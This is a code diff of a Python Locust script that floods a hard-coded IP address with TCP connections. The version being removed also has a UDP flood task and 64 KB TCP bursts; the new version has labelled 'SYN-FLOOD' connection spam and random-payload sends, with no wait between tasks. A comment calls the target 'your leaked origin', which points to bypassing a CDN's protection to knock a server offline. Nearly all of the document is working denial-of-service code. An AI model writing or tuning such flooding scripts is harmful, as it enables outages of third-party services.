@@ -1,101 +1,62 @@
-# locustfile_tcp_max_gbps_v2.py
+# locustfile_tcp.py
 from gevent import monkey
 monkey.patch_all()
 
-import socket, time
+import socket
+import time
+import random
+import string
 from locust import User, task, constant, events
 
-TARGET_IP   = "192.173.173.42"
-TARGET_PORT = 80
+TARGET_IP   = "192.173.173.42"   # your leaked origin
+TARGET_PORT = 443             # change to the port you want to stress
 
-# 64 KB chunk
-CHUNK_SIZE  = 64 * 1024
-CHUNK       = b"A" * CHUNK_SIZE
+def random_payload(length=128):
+    return "".join(random.choices(string.ascii_letters + string.digits, k=length)).encode()
 
-class GbpsUser(User):
-    wait_time = constant(0)
+class TCPPowerUser(User):
+    wait_time = constant(0)  # no pause between tasks
 
-    def on_start(self):
-        # Create a fresh socket per task to avoid reuse issues
-        pass
-
-    @task(10)  # heavier weight for smaller bursts
-    def tcp_burst_64k(self):
-        """
-        Open TCP, send 16 × 64 KB = 1 MB total,
-        but in smaller bites so buffers don't overflow.
-        """
-        start = time.time()
-        error = None
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((TARGET_IP, TARGET_PORT))
-            for _ in range(16):   # 16×64 KB = 1 MB
-                s.sendall(CHUNK)
-        except Exception as e:
-            error = e
-        finally:
-            try: s.close()
-            except: pass
-
-        elapsed = int((time.time() - start)*1000)
-        events.request.fire(
-            request_type="TCP-BURST",
-            name="16×64KB",
-            response_time=elapsed,
-            response_length=CHUNK_SIZE * 16,
-            exception=error,
-        )
-
-    @task(5)
-    def udp_flood_64k(self):
-        """
-        Fire 32 × 64 KB = 2 MB UDP packets,
-        but below MTU limits so they go through.
-        """
-        start = time.time()
-        error = None
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.settimeout(5)
-            for _ in range(32):  # 32×64 KB = 2 MB
-                s.sendto(CHUNK, (TARGET_IP, TARGET_PORT))
-        except Exception as e:
-            error = e
-        finally:
-            try: s.close()
-            except: pass
-
-        elapsed = int((time.time() - start)*1000)
-        events.request.fire(
-            request_type="UDP-FLOOD",
-            name="32×64KB",
-            response_time=elapsed,
-            response_length=CHUNK_SIZE * 32,
-            exception=error,
-        )
-
-    @task(2)
+    @task(7)
     def tcp_connect_only(self):
-        """SYN flood + immediate close"""
         start = time.time()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
         error = None
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((TARGET_IP, TARGET_PORT))
+            sock.connect((TARGET_IP, TARGET_PORT))
         except Exception as e:
             error = e
         finally:
-            try: s.close()
-            except: pass
-
-        elapsed = int((time.time() - start)*1000)
+            sock.close()
+        elapsed = int((time.time() - start) * 1000)
         events.request.fire(
             request_type="TCP-CONNECT",
             name="SYN-FLOOD",
             response_time=elapsed,
             response_length=0,
+            exception=error,
+        )
+
+    @task(3)
+    def tcp_send_payload(self):
+        payload = random_payload(random.randint(64, 512))
+        start = time.time()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        error = None
+        try:
+            sock.connect((TARGET_IP, TARGET_PORT))
+            sock.sendall(payload)
+        except Exception as e:
+            error = e
+        finally:
+            sock.close()
+        elapsed = int((time.time() - start) * 1000)
+        events.request.fire(
+            request_type="TCP-PAYLOAD",
+            name="SEND-BYTES",
+            response_time=elapsed,
+            response_length=len(payload),
             exception=error,
         )
